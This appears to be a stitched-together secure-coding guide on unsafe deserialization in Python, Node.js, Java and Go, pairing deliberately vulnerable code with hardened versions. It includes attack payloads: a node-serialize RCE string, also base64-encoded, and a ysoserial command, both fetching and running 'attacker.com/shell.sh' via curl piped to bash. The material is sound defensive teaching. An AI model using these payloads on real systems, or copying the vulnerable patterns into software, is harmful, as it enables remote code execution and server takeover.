When pickle is unavoidable (legacy ML systems, PyTorch models, scikit-learn), you must implement multiple defense layers. The key principle is: **never deserialize data from untrusted sources**. Here's a production-ready approach:

**PRODUCTION PATTERN**:

```python
import pickle
import hashlib
import hmac
import io
import os
import logging
from typing import Any, Optional, Set
from functools import wraps
from flask import Flask, request, abort, g
import redis
from datetime import datetime, timedelta

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration from environment
SIGNING_KEY = os.environ.get('MODEL_SIGNING_KEY', '').encode()
ALLOWED_MODEL_HASHES_KEY = 'allowed_model_hashes'
MAX_MODEL_SIZE = 500 * 1024 * 1024  # 500MB

# Redis for approved model registry
redis_client = redis.Redis(host='localhost', port=6379, db=0)

class RestrictedUnpickler(pickle.Unpickler):
    """
    Custom unpickler that restricts allowed classes.
    Defense in depth - even with signature verification.
    """

    # Whitelist of safe classes for ML models
    SAFE_MODULES = {
        'numpy': {'ndarray', 'dtype', 'float64', 'int64'},
        'sklearn.linear_model': {'LogisticRegression', 'LinearRegression'},
        'sklearn.ensemble': {'RandomForestClassifier', 'GradientBoostingClassifier'},
        'sklearn.preprocessing': {'StandardScaler', 'LabelEncoder'},
        'torch': {'Tensor'},
        'torch.nn': {'Linear', 'Conv2d', 'ReLU', 'Sequential'},
        'collections': {'OrderedDict'},
        'builtins': {'dict', 'list', 'tuple', 'set', 'frozenset'},
    }

    def find_class(self, module: str, name: str) -> Any:
        """Only allow whitelisted classes to be unpickled"""
        if module in self.SAFE_MODULES:
            if name in self.SAFE_MODULES[module]:
                return super().find_class(module, name)

        logger.critical(
            f"SECURITY: Blocked unsafe unpickle attempt - {module}.{name}"
        )
        raise pickle.UnpicklingError(
            f"Unsafe class blocked: {module}.{name}"
        )

def compute_file_hash(data: bytes) -> str:
    """Compute SHA-256 hash of file content"""
    return hashlib.sha256(data).hexdigest()

def verify_model_signature(data: bytes, signature: str) -> bool:
    """Verify HMAC-SHA256 signature"""
    if not SIGNING_KEY:
        logger.error("MODEL_SIGNING_KEY not configured")
        return False

    expected = hmac.new(SIGNING_KEY, data, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature)

def is_approved_model(file_hash: str) -> bool:
    """Check if model hash is in approved registry"""
    return redis_client.sismember(ALLOWED_MODEL_HASHES_KEY, file_hash)

def rate_limit(max_requests: int, window_seconds: int):
    """Rate limiting decorator"""
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            client_ip = request.remote_addr
            key = f"ratelimit:model_load:{client_ip}"

            current = redis_client.incr(key)
            if current == 1:
                redis_client.expire(key, window_seconds)

            if current > max_requests:
                logger.warning(f"Rate limit exceeded for {client_ip}")
                abort(429, 'Rate limit exceeded')

            return f(*args, **kwargs)
        return wrapped
    return decorator

def audit_log(event_type: str, details: dict):
    """Security audit logging"""
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'event_type': event_type,
        'client_ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        **details
    }
    logger.info(f"AUDIT: {log_entry}")
    # In production, send to SIEM/log aggregator
    redis_client.lpush('security_audit_log', str(log_entry))

@app.route('/api/load-model', methods=['POST'])
@rate_limit(max_requests=10, window_seconds=60)
def load_model_secure():
    """
    Production-secure model loading with multiple defense layers.
    """
    if 'model_file' not in request.files:
        return {'error': 'No file provided'}, 400

    file = request.files['model_file']
    signature = request.headers.get('X-Model-Signature')
    model_id = request.headers.get('X-Model-ID', 'unknown')

    # LAYER 1: Size validation
    data = file.read()
    if len(data) > MAX_MODEL_SIZE:
        audit_log('MODEL_LOAD_REJECTED', {
            'reason': 'size_exceeded',
            'size': len(data),
            'model_id': model_id
        })
        abort(400, 'Model file too large')

    file_hash = compute_file_hash(data)

    # LAYER 2: Signature verification (required)
    if not signature:
        audit_log('MODEL_LOAD_REJECTED', {
            'reason': 'missing_signature',
            'model_id': model_id,
            'file_hash': file_hash
        })
        abort(401, 'Model signature required')

    if not verify_model_signature(data, signature):
        audit_log('MODEL_LOAD_REJECTED', {
            'reason': 'invalid_signature',
            'model_id': model_id,
            'file_hash': file_hash
        })
        abort(403, 'Invalid model signature')

    # LAYER 3: Approved model registry check
    if not is_approved_model(file_hash):
        audit_log('MODEL_LOAD_REJECTED', {
            'reason': 'not_in_registry',
            'model_id': model_id,
            'file_hash': file_hash
        })
        abort(403, 'Model not in approved registry')

    # LAYER 4: Restricted unpickler with class whitelist
    try:
        model = RestrictedUnpickler(io.BytesIO(data)).load()
    except pickle.UnpicklingError as e:
        audit_log('MODEL_LOAD_BLOCKED', {
            'reason': 'unsafe_class_detected',
            'error': str(e),
            'model_id': model_id,
            'file_hash': file_hash
        })
        abort(400, 'Model contains unsafe components')
    except Exception as e:
        audit_log('MODEL_LOAD_ERROR', {
            'reason': 'unpickle_failed',
            'error': str(e),
            'model_id': model_id
        })
        abort(500, 'Failed to load model')

    audit_log('MODEL_LOAD_SUCCESS', {
        'model_id': model_id,
        'file_hash': file_hash,
        'model_type': str(type(model))
    })

    return {
        'status': 'Model loaded successfully',
        'model_hash': file_hash,
        'model_type': str(type(model))
    }

# Admin endpoint to approve models (protected by separate auth)
@app.route('/admin/approve-model', methods=['POST'])
def approve_model():
    """Add model hash to approved registry (admin only)"""
    # In production: require admin authentication
    model_hash = request.json.get('hash')
    if model_hash and len(model_hash) == 64:
        redis_client.sadd(ALLOWED_MODEL_HASHES_KEY, model_hash)
        audit_log('MODEL_APPROVED', {'hash': model_hash})
        return {'status': 'Model approved'}
    abort(400, 'Invalid hash')

if __name__ == '__main__':
    # Production: use gunicorn with proper worker settings
    app.run(host='0.0.0.0', port=8080)
```

**Defense in Depth Layers**:

1. **Cryptographic Signature Verification**:
```python
# Models must be signed by your build pipeline
def sign_model(model_path: str, signing_key: bytes) -> str:
    with open(model_path, 'rb') as f:
        data = f.read()
    return hmac.new(signing_key, data, hashlib.sha256).hexdigest()
```

2. **Approved Model Registry**:
```python
# Only pre-approved model hashes can be loaded
# Add during CI/CD pipeline after security scanning
redis_client.sadd('allowed_model_hashes', model_hash)
```

3. **RestrictedUnpickler with Class Whitelist**:
```python
# Even if signature is compromised, only safe classes load
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in SAFE_MODULES and name in SAFE_MODULES[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Blocked: {module}.{name}")
```

**Additional Protections**:
- **Sandboxed execution**: Run model loading in isolated containers with no network access
- **File scanning**: Integrate with tools like `picklescan` or `fickling` to detect malicious payloads before loading
- **Prefer safer alternatives**: Use ONNX format, SafeTensors (Hugging Face), or export model weights as numpy arrays with JSON metadata
- **Network isolation**: Model loading services should have no outbound internet access to prevent data exfiltration
- **Monitoring**: Alert on any `find_class` rejections as potential attack attempts

While `JSON.parse` is safer than many serialization methods, deserializing untrusted data without validation can still lead to prototype pollution and injection attacks. More dangerous are libraries like `node-serialize` that can execute arbitrary code during deserialization.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// DANGEROUS: Deserializing untrusted data from cookies
app.get('/dashboard', (req, res) => {
  const sessionData = req.cookies.session;

  if (sessionData) {
    // CRITICAL VULNERABILITY: Deserializing untrusted input
    const userSession = serialize.unserialize(sessionData);

    res.json({
      message: `Welcome back, ${userSession.username}`,
      preferences: userSession.preferences
    });
  } else {
    res.status(401).json({ error: 'No session found' });
  }
});

// Also vulnerable: Accepting serialized data in request body
app.post('/api/import-settings', (req, res) => {
  const { serializedSettings } = req.body;

  // DANGEROUS: Deserializing user-provided data
  const settings = serialize.unserialize(serializedSettings);

  // Apply settings...
  res.json({ success: true, settings });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized payload with IIFE for RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })}()"}

// Base64 encoded version for cookie injection
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaCB8IGJhc2gnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KX0oKSJ9
```

**Why This Is Dangerous**:
- `node-serialize` executes JavaScript functions during deserialization via the `_$$ND_FUNC$$_` marker
- Attacker-controlled data becomes executable code on the server
- Even `JSON.parse` alone can enable prototype pollution attacks
- No validation of data structure or content before deserialization
- Complete server compromise possible with a single malicious request

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const Joi = require('joi');
const crypto = require('crypto');

const app = express();
app.use(cookieParser());
app.use(express.json());

const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

// Define strict schema for session data
const sessionSchema = Joi.object({
  userId: Joi.string().uuid().required(),
  username: Joi.string().alphanum().min(3).max(30).required(),
  preferences: Joi.object({
    theme: Joi.string().valid('light', 'dark').default('light'),
    language: Joi.string().valid('en', 'es', 'fr', 'de').default('en')
  }).default({}),
  createdAt: Joi.date().iso().required(),
  expiresAt: Joi.date().iso().greater(Joi.ref('createdAt')).required()
}).options({ stripUnknown: true }); // Remove unexpected fields

// HMAC signature for data integrity
function signData(data) {
  const payload = JSON.stringify(data);
  const signature = crypto.createHmac('sha256', SESSION_SECRET)
    .update(payload)
    .digest('hex');
  return Buffer.from(`${signature}.${payload}`).toString('base64');
}

function verifyAndParse(signedData) {
  try {
    const decoded = Buffer.from(signedData, 'base64').toString('utf8');
    const [signature, payload] = decoded.split('.');

    // Verify HMAC signature first
    const expectedSignature = crypto.createHmac('sha256', SESSION_SECRET)
      .update(payload)
      .digest('hex');

    if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSignature))) {
      return { valid: false, error: 'Invalid signature' };
    }

    // Only parse after signature verification
    const data = JSON.parse(payload);

    // Validate against schema
    const { error, value } = sessionSchema.validate(data);
    if (error) {
      return { valid: false, error: `Schema validation failed: ${error.message}` };
    }

    // Check expiration
    if (new Date(value.expiresAt) < new Date()) {
      return { valid: false, error: 'Session expired' };
    }

    return { valid: true, data: value };
  } catch (e) {
    return { valid: false, error: 'Malformed data' };
  }
}

app.get('/dashboard', (req, res) => {
  const sessionData = req.cookies.session;

  if (!sessionData) {
    return res.status(401).json({ error: 'No session found' });
  }

  const result = verifyAndParse(sessionData);

  if (!result.valid) {
    console.warn(`Invalid session attempt: ${result.error}`);
    return res.status(401).json({ error: 'Invalid session' });
  }

  res.json({
    message: `Welcome back, ${result.data.username}`,
    preferences: result.data.preferences
  });
});

app.listen(3000);
```

**Key Security Controls**:
- **HMAC signature verification**: Ensures data hasn't been tampered with using timing-safe comparison
- **Schema validation with Joi**: Strictly defines allowed data types, values, and structure
- **stripUnknown option**: Removes any unexpected fields that could contain malicious data
- **No unsafe deserialization libraries**: Uses only native `JSON.parse` after integrity verification
- **Expiration checking**: Prevents replay attacks with old session data

Handling complex objects from external sources requires multiple layers of defense: source verification, content validation, sandboxed parsing, and continuous monitoring. Here's a production-ready approach for safely importing external data.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const Joi = require('joi');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { createLogger, format, transports } = require('winston');
const vm = require('vm');

const app = express();
app.use(express.json({ limit: '100kb' })); // Limit payload size

// Security-focused logging
const securityLogger = createLogger({
  level: 'info',
  format: format.combine(
    format.timestamp(),
    format.json()
  ),
  defaultMeta: { service: 'data-import' },
  transports: [
    new transports.File({ filename: 'security-events.log' }),
    new transports.Console()
  ]
});

// Rate limiting for import endpoints
const importLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // 10 imports per window
  message: { error: 'Too many import requests, please try again later' },
  standardHeaders: true,
  legacyHeaders: false
});

// Trusted API sources with their public keys
const TRUSTED_SOURCES = {
  'api.partner.com': {
    publicKey: process.env.PARTNER_PUBLIC_KEY,
    allowedSchemas: ['configV1', 'configV2']
  },
  'internal-service.company.com': {
    publicKey: process.env.INTERNAL_PUBLIC_KEY,
    allowedSchemas: ['configV1', 'configV2', 'fullConfig']
  }
};

// Schema definitions for different config types
const schemas = {
  configV1: Joi.object({
    version: Joi.string().valid('1.0').required(),
    settings: Joi.object({
      featureFlags: Joi.object().pattern(
        Joi.string().alphanum().max(50),
        Joi.boolean()
      ).max(100),
      limits: Joi.object({
        maxUsers: Joi.number().integer().min(1).max(10000),
        maxStorage: Joi.number().integer().min(1).max(1000000)
      })
    }).required(),
    metadata: Joi.object({
      createdAt: Joi.date().iso(),
      source: Joi.string().max(100)
    })
  }).options({ stripUnknown: true }),

  configV2: Joi.object({
    version: Joi.string().valid('2.0').required(),
    modules: Joi.array().items(
      Joi.object({
        name: Joi.string().alphanum().max(50).required(),
        enabled: Joi.boolean().required(),
        config: Joi.object().pattern(
          Joi.string().max(50),
          Joi.alternatives().try(
            Joi.string().max(500),
            Joi.number(),
            Joi.boolean()
          )
        ).max(50)
      })
    ).max(50)
  }).options({ stripUnknown: true })
};

// Safe JSON parser with prototype pollution protection
function safeJSONParse(jsonString, maxDepth = 10) {
  // Size check
  if (jsonString.length > 100000) {
    throw new Error('JSON payload too large');
  }

  // Check for prototype pollution patterns before parsing
  const dangerousPatterns = [
    /__proto__/i,
    /constructor/i,
    /prototype/i
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(jsonString)) {
      throw new Error('Potentially malicious content detected');
    }
  }

  // Parse in isolated context with timeout
  const context = vm.createContext({ JSON, result: null });
  const script = new vm.Script(`result = JSON.parse(${JSON.stringify(jsonString)})`);

  try {
    script.runInContext(context, { timeout: 1000 }); // 1 second timeout
  } catch (e) {
    throw new Error('JSON parsing failed or timed out');
  }

  // Depth check
  function checkDepth(obj, currentDepth = 0) {
    if (currentDepth > maxDepth) {
      throw new Error('Object nesting too deep');
    }
    if (obj && typeof obj === 'object') {
      for (const value of Object.values(obj)) {
        checkDepth(value, currentDepth + 1);
      }
    }
  }

  checkDepth(context.result);

  // Return a clean copy without prototype chain
  return JSON.parse(JSON.stringify(context.result));
}

// Verify signature from external source
async function verifyExternalSignature(payload, signature, source) {
  const sourceConfig = TRUSTED_SOURCES[source];
  if (!sourceConfig) {
    return { valid: false, error: 'Unknown source' };
  }

  try {
    const verifier = crypto.createVerify('RSA-SHA256');
    verifier.update(payload);

    const isValid = verifier.verify(
      sourceConfig.publicKey,
      Buffer.from(signature, 'base64')
    );

    return { valid: isValid, allowedSchemas: sourceConfig.allowedSchemas };
  } catch (e) {
    return { valid: false, error: 'Signature verification failed' };
  }
}

// Main import endpoint
app.post('/api/import-config', importLimiter, async (req, res) => {
  const requestId = crypto.randomUUID();
  const clientIP = req.ip;

  securityLogger.info('Import request received', {
    requestId,
    clientIP,
    source: req.headers['x-source-identifier']
  });

  try {
    // Extract and validate headers
    const source = req.headers['x-source-identifier'];
    const signature = req.headers['x-payload-signature'];
    const schemaVersion = req.headers['x-schema-version'];

    if (!source || !signature || !schemaVersion) {
      securityLogger.warn('Missing required headers', { requestId, clientIP });
      return res.status(400).json({ error: 'Missing required headers' });
    }

    // Get raw body for signature verification
    const rawPayload = JSON.stringify(req.body);

    // Verify source and signature
    const verification = await verifyExternalSignature(rawPayload, signature, source);

    if (!verification.valid) {
      securityLogger.warn('Signature verification failed', {
        requestId,
        clientIP,
        source,
        error: verification.error
      });
      return res.status(403).json({ error: 'Invalid signature' });
    }

    // Check if schema is allowed for this source
    if (!verification.allowedSchemas.includes(schemaVersion)) {
      securityLogger.warn('Schema not allowed for source', {
        requestId,
        source,
        requestedSchema: schemaVersion
      });
      return res.status(403).json({ error: 'Schema not allowed for this source' });
    }

    // Safe parse the payload
    let parsedData;
    try {
      parsedData = safeJSONParse(rawPayload);
    } catch (parseError) {
      securityLogger.warn('Safe parse failed', {
        requestId,
        error: parseError.message
      });
      return res.status(400).json({ error: 'Invalid payload format' });
    }

    // Validate against schema
    const schema = schemas[schemaVersion];
    if (!schema) {
      return res.status(400).json({ error: 'Unknown schema version' });
    }

    const { error, value } = schema.validate(parsedData);
    if (error) {
      securityLogger.warn('Schema validation failed', {
        requestId,
        validationErrors: error.details.map(d => d.message)
      });
      return res.status(400).json({ 
        error: 'Validation failed',
        details: error.details.map(d => d.message)
      });
    }

    // Process the validated config
    const configId = crypto.randomUUID();

    securityLogger.info('Config imported successfully', {
      requestId,
      configId,
      source,
      schemaVersion,
      clientIP
    });

    // Store with audit trail
    const auditRecord = {
      configId,
      importedAt: new Date().toISOString(),
      source,
      clientIP,
      schemaVersion,
      checksum: crypto.createHash('sha256').update(JSON.stringify(value)).digest('hex')
    };

    res.json({
      success: true,
      configId,
      message: 'Configuration imported successfully'
    });

  } catch (e) {
    securityLogger.error('Import processing error', {
      requestId,
      error: e.message,
      stack: process.env.NODE_ENV === 'development' ? e.stack : undefined
    });

    res.status(500).json({ error: 'Import processing failed' });
  }
});

// Health check for monitoring
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
```

**Defense in Depth Layers**:

1. **Source Verification with Cryptographic Signatures**:
```javascript
// Only accept data from known, trusted sources
const verification = await verifyExternalSignature(rawPayload, signature, source);
if (!verification.valid) {
  return res.status(403).json({ error: 'Invalid signature' });
}
```

2. **Safe Parsing with Prototype Pollution Protection**:
```javascript
// Block dangerous patterns before parsing
const dangerousPatterns = [/__proto__/i, /constructor/i, /prototype/i];
for (const pattern of dangerousPatterns) {
  if (pattern.test(jsonString)) {
    throw new Error('Potentially malicious content detected');
  }
}
// Parse in sandboxed context with timeout
script.runInContext(context, { timeout: 1000 });
```

3. **Strict Schema Validation with Allowlists**:
```javascript
// Only allow known values, strip everything else
Joi.object({
  theme: Joi.string().valid('light', 'dark'), // Allowlist, not blocklist
  language: Joi.string().valid('en', 'es', 'fr', 'de')
}).options({ stripUnknown: true }); // Remove unexpected fields
```

**Additional Protections**:
- **Payload size limits**: `express.json({ limit: '100kb' })` prevents DoS via large payloads
- **Rate limiting**: Prevents abuse of import functionality
- **Depth limiting**: Prevents stack overflow from deeply nested objects
- **Audit logging**: Complete trail of all import attempts for incident response
- **Schema versioning**: Source-specific schema permissions prevent unauthorized data types
- **Checksum storage**: Enables integrity verification of stored configurations
- **Timeout on parsing**: Prevents ReDoS and infinite loop attacks in malformed JSON

Using `ObjectInputStream` directly on untrusted data is extremely dangerous and has led to numerous critical vulnerabilities including remote code execution. The 2023 Atlassian Confluence vulnerability (CVE-2023-22527) and earlier Apache Commons Collections gadget chains demonstrate how attackers can achieve complete server takeover.

**VULNERABLE CODE**:

```java
import java.io.*;
import javax.servlet.http.*;
import javax.servlet.annotation.WebServlet;

@WebServlet("/api/import")
public class DataImportServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // VULNERABLE: Deserializing untrusted data
        try (ObjectInputStream ois = new ObjectInputStream(
                request.getInputStream())) {

            Object importedData = ois.readObject();  // RCE vulnerability!

            if (importedData instanceof UserProfile) {
                UserProfile profile = (UserProfile) importedData;
                processProfile(profile);
                response.getWriter().write("Import successful");
            }
        } catch (ClassNotFoundException e) {
            response.sendError(400, "Invalid data format");
        }
    }

    private void processProfile(UserProfile profile) {
        // Business logic
    }
}
```

**Attack Payload** (using ysoserial):
```bash
# Generate malicious serialized object using ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' > payload.bin

# Send to vulnerable endpoint
curl -X POST --data-binary @payload.bin http://target.com/api/import
```

**Why This Is Dangerous**:
- Java deserialization executes code in object's `readObject()` method BEFORE type checking
- Libraries like Apache Commons Collections contain "gadget chains" enabling arbitrary code execution
- The attacker's code runs with full server privileges
- No authentication bypass needed - just sending the payload triggers execution

**SECURE VERSION**:

```java
import java.io.*;
import javax.servlet.http.*;
import javax.servlet.annotation.WebServlet;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;

@WebServlet("/api/import")
public class SecureDataImportServlet extends HttpServlet {

    private static final ObjectMapper mapper;

    static {
        mapper = new ObjectMapper();
        // SECURITY: Disable dangerous features
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
        mapper.deactivateDefaultTyping();  // Prevent polymorphic deserialization attacks
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        // SECURE: Use JSON with explicit type binding
        try {
            // Validate content type
            if (!"application/json".equals(request.getContentType())) {
                response.sendError(415, "Unsupported Media Type");
                return;
            }

            // Limit input size to prevent DoS
            if (request.getContentLengthLong() > 1024 * 1024) {
                response.sendError(413, "Payload too large");
                return;
            }

            // SECURE: Deserialize to specific known type only
            UserProfileDTO profile = mapper.readValue(
                request.getInputStream(), 
                UserProfileDTO.class  // Explicit, safe type
            );

            // Validate deserialized data
            if (!isValid(profile)) {
                response.sendError(400, "Invalid profile data");
                return;
            }

            processProfile(profile);
            response.getWriter().write("Import successful");

        } catch (Exception e) {
            log("Deserialization failed: " + e.getMessage());
            response.sendError(400, "Invalid data format");
        }
    }

    private boolean isValid(UserProfileDTO profile) {
        return profile != null 
            && profile.getUsername() != null 
            && profile.getUsername().matches("^[a-zA-Z0-9_]{3,30}$");
    }

    private void processProfile(UserProfileDTO profile) {
        // Business logic with validated data
    }
}
```

**Key Security Controls**:
- **Use JSON instead of Java serialization**: JSON cannot contain executable code
- **Explicit type binding**: Deserialize only to known, safe DTOs - never use polymorphic types
- **Disable default typing**: Prevents Jackson from deserializing to arbitrary classes
- **Input validation**: Verify data after deserialization before use

If you must use Java serialization for legacy systems, you need multiple defensive layers. The key is implementing strict allowlist-based filtering using `ObjectInputFilter` (Java 9+) combined with signature verification and monitoring.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.security.*;
import java.util.*;
import java.util.logging.*;
import javax.crypto.*;
import javax.crypto.spec.*;

public class SecureDeserializationService {

    private static final Logger SECURITY_LOG = Logger.getLogger("SecurityAudit");
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.company.dto.UserProfile",
        "com.company.dto.ConfigData",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.ArrayList",
        "java.util.HashMap"
    );
    private static final int MAX_DEPTH = 5;
    private static final int MAX_ARRAY_LENGTH = 10000;
    private static final long MAX_BYTES = 1024 * 1024; // 1MB

    private final SecretKey hmacKey;

    public SecureDeserializationService(SecretKey hmacKey) {
        this.hmacKey = hmacKey;
    }

    public Object deserialize(byte[] signature, byte[] data, String sourceId) 
            throws SecurityException {

        // LAYER 1: Verify HMAC signature before any deserialization
        if (!verifySignature(signature, data)) {
            SECURITY_LOG.severe("ALERT: Invalid signature from source: " + sourceId);
            throw new SecurityException("Data integrity check failed");
        }

        // LAYER 2: Size limits
        if (data.length > MAX_BYTES) {
            SECURITY_LOG.warning("Oversized payload rejected from: " + sourceId);
            throw new SecurityException("Payload exceeds size limit");
        }

        // LAYER 3: Class allowlist filter
        ObjectInputFilter filter = createSecurityFilter();

        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bais)) {

            // Apply the security filter
            ois.setObjectInputFilter(filter);

            Object result = ois.readObject();

            // LAYER 4: Post-deserialization type validation
            validateResultType(result);

            SECURITY_LOG.info("Successful deserialization from: " + sourceId + 
                             ", type: " + result.getClass().getName());

            return result;

        } catch (InvalidClassException e) {
            SECURITY_LOG.severe("BLOCKED: Unauthorized class attempted: " + e.getMessage());
            throw new SecurityException("Deserialization blocked: unauthorized class");
        } catch (ClassNotFoundException | IOException e) {
            SECURITY_LOG.warning("Deserialization failed from " + sourceId + ": " + e.getMessage());
            throw new SecurityException("Deserialization failed");
        }
    }

    private ObjectInputFilter createSecurityFilter() {
        return filterInfo -> {
            Class<?> clazz = filterInfo.serialClass();

            // Allow null class (for primitives)
            if (clazz == null) {
                return ObjectInputFilter.Status.ALLOWED;
            }

            // Check depth limit
            if (filterInfo.depth() > MAX_DEPTH) {
                SECURITY_LOG.warning("Depth limit exceeded: " + filterInfo.depth());
                return ObjectInputFilter.Status.REJECTED;
            }

            // Check array length
            if (filterInfo.arrayLength() > MAX_ARRAY_LENGTH) {
                SECURITY_LOG.warning("Array length limit exceeded");
                return ObjectInputFilter.Status.REJECTED;
            }

            // STRICT ALLOWLIST - reject anything not explicitly allowed
            String className = clazz.getName();
            if (ALLOWED_CLASSES.contains(className)) {
                return ObjectInputFilter.Status.ALLOWED;
            }

            // Allow primitives and their arrays
            if (clazz.isPrimitive() || 
                (clazz.isArray() && clazz.getComponentType().isPrimitive())) {
                return ObjectInputFilter.Status.ALLOWED;
            }

            SECURITY_LOG.severe("BLOCKED class: " + className);
            return ObjectInputFilter.Status.REJECTED;
        };
    }

    private boolean verifySignature(byte[] signature, byte[] data) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(hmacKey);
            byte[] expectedSignature = mac.doFinal(data);
            return MessageDigest.isEqual(signature, expectedSignature);
        } catch (Exception e) {
            return false;
        }
    }

    private void validateResultType(Object result) throws SecurityException {
        if (result == null) return;

        String className = result.getClass().getName();
        if (!ALLOWED_CLASSES.contains(className) && 
            !result.getClass().isPrimitive()) {
            throw new SecurityException("Unexpected result type: " + className);
        }
    }

    // For serializing data (ensures HMAC is attached)
    public SerializedPayload serialize(Serializable object) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {

            oos.writeObject(object);
            byte[] data = baos.toByteArray();

            // Generate HMAC
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(hmacKey);
            byte[] signature = mac.doFinal(data);

            return new SerializedPayload(signature, data);

        } catch (Exception e) {
            throw new IOException("Serialization failed", e);
        }
    }

    public record SerializedPayload(byte[] signature, byte[] data) {}
}
```

**Defense in Depth Layers**:

1. **Cryptographic Signature Verification**:
```java
// HMAC verification BEFORE deserialization prevents processing attacker-crafted data
if (!verifySignature(signature, data)) {
    throw new SecurityException("Integrity check failed");
}
```

2. **ObjectInputFilter with Strict Allowlist**:
```java
// Only explicitly approved classes can be deserialized
private static final Set<String> ALLOWED_CLASSES = Set.of(
    "com.company.dto.UserProfile",  // Your safe DTOs only
    "java.lang.String"               // Safe JDK classes
);
// Everything else is REJECTED by default
```

3. **Resource Limits**:
```java
// Prevent DoS via deeply nested objects or large arrays
if (filterInfo.depth() > MAX_DEPTH) return REJECTED;
if (filterInfo.arrayLength() > MAX_ARRAY_LENGTH) return REJECTED;
if (data.length > MAX_BYTES) throw new SecurityException("Payload too large");
```

**Additional Protections**:

- **Remove dangerous libraries**: If possible, exclude Apache Commons Collections, Spring BeanUtils, and other known gadget chain sources from your classpath
- **Use serialization proxy pattern**: Implement `writeReplace()` and `readResolve()` in your serializable classes to control reconstruction
- **Runtime Application Self-Protection (RASP)**: Tools like Contrast Security can block known gadget chains
- **JVM-level filtering**: Set global filter via `jdk.serialFilter` system property as backup:
```bash
java -Djdk.serialFilter="com.company.dto.*;java.lang.*;!*" -jar app.jar
```
- **Network segmentation**: Ensure serialization endpoints are not exposed to untrusted networks
- **Consider migration**: Plan transition to JSON/Protobuf for new development - Java serialization is inherently risky

Unsafe deserialization is a critical vulnerability that can lead to remote code execution, denial of service, or data tampering. In Go, while gob and JSON are generally safer than Java serialization, they can still be exploited through type confusion, resource exhaustion, or when combined with reflection-based patterns.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/gob"
	"encoding/json"
	"io"
	"net/http"
	"reflect"
)

// DANGEROUS: Accepts any type registration dynamically
var typeRegistry = make(map[string]reflect.Type)

func RegisterType(name string, t interface{}) {
	typeRegistry[name] = reflect.TypeOf(t)
}

// VULNERABLE: Deserializes arbitrary types based on user input
func handleGobDecode(w http.ResponseWriter, r *http.Request) {
	typeName := r.URL.Query().Get("type")

	// DANGEROUS: Type is controlled by user
	if t, exists := typeRegistry[typeName]; exists {
		obj := reflect.New(t).Interface()
		decoder := gob.NewDecoder(r.Body)
		// VULNERABLE: No size limits, no validation
		if err := decoder.Decode(obj); err != nil {
			http.Error(w, err.Error(), 500) // Leaks error details
			return
		}
		processObject(obj) // Processes untrusted object
	}
}

// VULNERABLE: Unmarshals into interface{} allowing any structure
func handleJSONDecode(w http.ResponseWriter, r *http.Request) {
	var data interface{}
	// DANGEROUS: No size limit on body
	body, _ := io.ReadAll(r.Body)
	// VULNERABLE: Unmarshals arbitrary JSON structure
	json.Unmarshal(body, &data)
	processJSON(data)
}
